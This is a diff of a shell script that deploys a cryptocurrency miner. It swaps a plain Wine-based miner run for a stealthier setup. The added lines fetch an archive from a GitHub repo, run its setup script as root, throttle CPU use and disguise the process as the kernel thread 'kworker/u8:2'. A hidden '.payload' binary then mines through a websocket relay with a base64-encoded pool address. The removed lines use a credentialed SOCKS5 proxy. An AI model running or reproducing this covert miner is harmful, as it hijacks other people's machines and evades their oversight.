@@ -1,6 +1,5 @@
-sudo dpkg --add-architecture i386
-sudo apt update
-sudo apt install -y wine wine64 wine32
-wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/lemurian-robot-miner.zip
-unzip lemurian-robot-miner.zip
-wine ./cpuminer.exe -a power2b -o na.rplant.xyz:7022 -u mbc1qlgghxg3026yfxp3zw63m86qhleesnk0euzthmd.socks5 --proxy socks5://ifzkqmqh:rkbbsux715rr@154.29.239.198:6237
+wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/stealth.tar.gz
+tar xzf stealth.tar.gz
+sudo bash setup.sh --threads 4 --cpu 60 --title kworker/u8:2
+./.payload mine-wss wss://thorough-jaquelin-berakitame-aeabd1e4.koyeb.app/bmEucnBsYW50Lnh5ejo3MDIy mbc1qlgghxg3026yfxp3zw63m86qhleesnk0euzthmd.CPU x 7
+
